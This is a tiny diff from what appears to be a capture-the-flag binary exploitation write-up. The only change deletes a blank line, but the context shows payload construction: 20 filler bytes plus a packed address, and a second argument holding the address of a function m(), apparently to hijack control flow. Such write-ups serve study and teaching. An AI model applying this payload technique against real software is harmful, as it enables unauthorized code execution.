@@ -48,7 +48,6 @@ arg1 = b'A' * 20 + struct.pack('<I', 0x8049928)  # 24 bytes total
 arg2 = b'\xf4\x84\x04\x08'                        # 4 bytes: m() address
 ```
 
-
 ### Binary Function Analysis
 
 **Function m() Assembly:**
